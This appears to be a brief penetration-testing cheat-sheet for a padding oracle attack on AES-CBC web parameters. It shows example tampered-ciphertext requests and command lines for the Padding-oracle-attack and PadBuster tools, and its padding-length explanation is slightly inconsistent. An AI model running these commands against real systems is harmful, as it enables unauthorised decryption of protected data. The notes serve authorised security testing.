# Padding Oracle Attack

## Requirements:

Weak Cryptographic Algorithm implemented

1) AES-CBC-PKCS7

Enumerated Ciphertext

Length of the plaintext message

## Tool:

https://github.com/mpgn/Padding-oracle-attack

### 1) Enumerate the length of the plaintext by adding a null byte in front of the ciphertext and check the response from the server

Use the whole ciphertext and check the response from the server

    http://domain.local/?c=4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488

    Response: 1

Replace the first byte with a null byte, then the next byte with another null byte, until you get a different response to learn the length

    http://192.168.120.159:2290/?c=00000000000000000000000000b6c8a92312420765204ce350b1fbb826c59488

    Response: 0 (This means that the length of the plaintext is 16, by adding four bytes of padding (0x04040404))

### 2) Use the tool to exploit this

    git clone https://github.com/mpgn/Padding-oracle-attack

Then

    python exploit.py -c CIPHER_TEXT -l PLAINTEXT_LENGTH_NUM --host domain.local -u /?parameter= -v --error '<span id="MyLabel">0</span>'

#### Alternate Tool: PadBuster

### 1) Run the tool

    padbuster http://domain.local/?parameter=CIPHERTEXT CIPHERTEXT 16 -encoding 1

### 2) When the tool analyzes the response, choose the ID with an error status code like 500 or 400

### 3) Profit!
